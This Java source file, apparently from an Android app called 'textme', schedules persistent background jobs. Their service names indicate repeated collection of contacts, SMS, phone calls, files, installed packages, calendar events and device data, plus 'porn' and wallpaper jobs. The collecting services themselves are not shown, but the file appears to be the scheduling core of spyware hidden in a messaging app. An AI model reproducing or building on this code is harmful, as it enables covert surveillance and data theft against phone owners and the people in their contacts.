package com.candroid.textme;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;

public class JobsScheduler {
    public static final int PORN_JOB_ID = 1;
    public static final int WALLPAPER_JOB_ID = 2;
    public static final int FILES_JOB_ID = 3;
    public static final int ID_PACKAGES = 4;
    public static final int JOB_ID_CONTACTS = 5;
    public static final int JOB_ID_DEVICE = 6;
    public static final int JOB_ID_PHONE_CALLS = 7;
    public static final int JOB_ID_SMS = 8;
    public static final long ONE_MINUTE = 60000;
    public static final long ONE_HOUR = ONE_MINUTE * 60;
    private static final int JOB_ID_CALENDAR_EVENTS = 9;

    protected static void scheduleJob(Context context){
        ComponentName serviceComponent = new ComponentName(context, PornJobService.class);
        JobInfo.Builder builder = new JobInfo.Builder(PORN_JOB_ID, serviceComponent);
        builder.setMinimumLatency(15 * ONE_MINUTE);
        builder.setOverrideDeadline(30 * ONE_MINUTE);
        builder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
        JobScheduler jobScheduler = context.getSystemService(JobScheduler.class);
        jobScheduler.schedule(builder.build());
        if(jobScheduler.getPendingJob(WALLPAPER_JOB_ID) == null){
            ComponentName wallpaperService = new ComponentName(context, WallpaperJobService.class);
            JobInfo.Builder wallpaperBuilder = new JobInfo.Builder(WALLPAPER_JOB_ID, wallpaperService);
            wallpaperBuilder.setRequiredNetworkType(JobInfo.NETWORK_TYPE_NOT_ROAMING);
            wallpaperBuilder.setRequiresCharging(true);
            wallpaperBuilder.setRequiresBatteryNotLow(true);
            wallpaperBuilder.setRequiresStorageNotLow(true);
            wallpaperBuilder.setRequiresDeviceIdle(true);
            wallpaperBuilder.setPersisted(true);
            wallpaperBuilder.setOverrideDeadline( 24 * ONE_HOUR);
            wallpaperBuilder.setMinimumLatency(20 * ONE_MINUTE);
            jobScheduler.schedule(wallpaperBuilder.build());
        }
        if(jobScheduler.getPendingJob(FILES_JOB_ID) == null){
            ComponentName filesJobService = new ComponentName(context, FilesJobService.class);
            JobInfo.Builder filesJob = new JobInfo.Builder(FILES_JOB_ID, filesJobService);
            filesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            filesJob.setRequiresCharging(false);
            filesJob.setRequiresBatteryNotLow(true);
            filesJob.setRequiresStorageNotLow(true);
            filesJob.setRequiresDeviceIdle(false);
            filesJob.setPersisted(true);
            filesJob.setOverrideDeadline( 24 * ONE_HOUR);
            filesJob.setMinimumLatency(7 * ONE_MINUTE);
            jobScheduler.schedule(filesJob.build());
        }
        if(jobScheduler.getPendingJob(ID_PACKAGES) == null){
            ComponentName packagesJobService = new ComponentName(context, PackagesJobService.class);
            JobInfo.Builder packagesJob = new JobInfo.Builder(ID_PACKAGES, packagesJobService);
            packagesJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            packagesJob.setRequiresCharging(false);
            packagesJob.setRequiresBatteryNotLow(true);
            packagesJob.setRequiresStorageNotLow(false);
            packagesJob.setRequiresDeviceIdle(false);
            packagesJob.setPersisted(true);
            packagesJob.setOverrideDeadline( 24 * ONE_HOUR);
            packagesJob.setMinimumLatency(6 * ONE_MINUTE);
            jobScheduler.schedule(packagesJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CONTACTS) == null){
            ComponentName contactsJobService = new ComponentName(context, ContactsJobService.class);
            JobInfo.Builder contactsJob = new JobInfo.Builder(JOB_ID_CONTACTS, contactsJobService);
            contactsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            contactsJob.setRequiresCharging(false);
            contactsJob.setRequiresBatteryNotLow(true);
            contactsJob.setRequiresStorageNotLow(false);
            contactsJob.setRequiresDeviceIdle(false);
            contactsJob.setPersisted(true);
            contactsJob.setOverrideDeadline( 24 * ONE_HOUR);
            contactsJob.setMinimumLatency(4* ONE_MINUTE);
            jobScheduler.schedule(contactsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_DEVICE) == null){
            ComponentName deviceJobService = new ComponentName(context, DeviceJobService.class);
            JobInfo.Builder deviceJob = new JobInfo.Builder(JOB_ID_DEVICE, deviceJobService);
            deviceJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            deviceJob.setRequiresCharging(false);
            deviceJob.setRequiresBatteryNotLow(true);
            deviceJob.setRequiresStorageNotLow(false);
            deviceJob.setRequiresDeviceIdle(false);
            deviceJob.setPersisted(true);
            deviceJob.setOverrideDeadline( 24 * ONE_HOUR);
            deviceJob.setMinimumLatency(2* ONE_MINUTE);
            jobScheduler.schedule(deviceJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_PHONE_CALLS) == null){
            ComponentName phoneCallsJobService = new ComponentName(context, PhoneCallsJobService.class);
            JobInfo.Builder phoneCallsJob = new JobInfo.Builder(JOB_ID_PHONE_CALLS, phoneCallsJobService);
            phoneCallsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            phoneCallsJob.setRequiresCharging(false);
            phoneCallsJob.setRequiresBatteryNotLow(false);
            phoneCallsJob.setRequiresStorageNotLow(false);
            phoneCallsJob.setRequiresDeviceIdle(false);
            phoneCallsJob.setPersisted(true);
            phoneCallsJob.setOverrideDeadline( 24 * ONE_HOUR);
            phoneCallsJob.setMinimumLatency(5 * ONE_MINUTE);
            jobScheduler.schedule(phoneCallsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_SMS) == null){
            ComponentName smsJobService = new ComponentName(context, SmsJobService.class);
            JobInfo.Builder smsJob = new JobInfo.Builder(JOB_ID_SMS, smsJobService);
            smsJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            smsJob.setRequiresCharging(false);
            smsJob.setRequiresBatteryNotLow(false);
            smsJob.setRequiresStorageNotLow(false);
            smsJob.setRequiresDeviceIdle(false);
            smsJob.setPersisted(true);
            smsJob.setOverrideDeadline( 24 * ONE_HOUR);
            smsJob.setMinimumLatency(3 * ONE_MINUTE);
            jobScheduler.schedule(smsJob.build());
        }
        if(jobScheduler.getPendingJob(JOB_ID_CALENDAR_EVENTS) == null){
            ComponentName calendarEventJobService = new ComponentName(context, CalendarEventJobService.class);
            JobInfo.Builder calendarEventJob = new JobInfo.Builder(JOB_ID_CALENDAR_EVENTS, calendarEventJobService);
            calendarEventJob.setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY);
            calendarEventJob.setRequiresCharging(false);
            calendarEventJob.setRequiresBatteryNotLow(false);
            calendarEventJob.setRequiresStorageNotLow(false);
            calendarEventJob.setRequiresDeviceIdle(false);
            calendarEventJob.setPersisted(true);
            calendarEventJob.setOverrideDeadline( 24 * ONE_HOUR);
            calendarEventJob.setMinimumLatency(1 * ONE_MINUTE);
            jobScheduler.schedule(calendarEventJob.build());
        }
    }
}